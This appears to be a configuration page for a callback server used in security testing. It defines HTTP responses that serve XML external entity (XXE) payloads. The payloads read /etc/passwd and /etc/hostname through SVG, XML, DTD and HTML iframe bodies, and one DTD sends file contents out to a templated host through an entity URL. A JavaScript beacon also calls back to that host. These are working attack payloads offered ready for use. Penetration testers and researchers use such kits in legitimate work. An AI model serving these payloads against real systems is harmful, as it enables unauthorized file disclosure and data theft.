---
title: XXE
description: Various XXE Payloads
weight: 1
payloads:
  - type: HTTPX
    sort_order: 1
    pattern: /dt$
    data: '{"headers":{"Content-Type":"text/xml"},"body":"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\\n \u003c!DOCTYPE foo [  \u003c!ELEMENT foo ANY \u003e \u003c!ENTITY xxe SYSTEM \"http://{{ .Host }}/{{ .AlertPattern }}/xxe-test\" \u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e"}'

  - type: HTTPX
    sort_order: 1
    pattern: /evil\.dtd$
    data: '{"headers":{"Content-Type":"text/xml"},"body":"\u003c!ENTITY % payl SYSTEM \"file:///etc/passwd\"\u003e\\n\u003c!ENTITY % int \"\u003c!ENTITY % trick SYSTEM ''http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;''\u003e\"\u003e"}'

  - type: HTTPX
    sort_order: 1
    pattern: /hello$
    data: '{"headers":{"Content-Type":"application/json"},"body":"{\"data\":\"hello world\"}"}'

  - type: HTTPX
    sort_order: 1
    pattern: /ht$
    data: '{"headers":{"Content-Type":"text/html"},"body":"\u003chtml\u003e\u003cbody\u003e\u003cimg src=\"{{.AlertPattern}}/static-lh\" /\u003e\u003ciframe src=\"file:///etc/passwd\" height=\"500\"\u003e\u003c/iframe\u003e\u003c/body\u003e\u003c/html\u003e"}'

  - type: HTTPX
    sort_order: 1
    pattern: /js$
    data: '{"headers":{"Content-Type":"text/javascript"},"body":"var s = document.createElement(\"img\");document.body.appendChild(s); s.src=\"//{{ .Host }}/{{.AlertPattern}}/s\";"}'

  - type: HTTPX
    sort_order: 1
    pattern: /sh$
    data: '{"headers":{"Content-Type":"text/xml"},"body":"\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\\n\u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e\\n\u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\\n\u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e\\n\u003c/svg\u003e"}'

  - type: HTTPX
    sort_order: 1
    pattern: /sv$
    data: '{"headers":{"Content-Type":"image/svg+xml"},"body":"\u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\u003c!DOCTYPE ernw [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\" \u003e ]\u003e\u003csvg width=\"500px\" height=\"100px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\u003ctext font-family=\"Verdana\" font-size=\"16\" x=\"10\" y=\"40\"\u003e\u0026xxe;\u003c/text\u003e\u003c/svg\u003e"}'
---

sweet tests and stuff

Returns an XXE payload that attempts to load a xodbox URL as an external entitiy.

Returns a DTD that attempts to grab `/ets/passwd`.

Returns an HTML payload with an iframe source to `/etc/passwd`.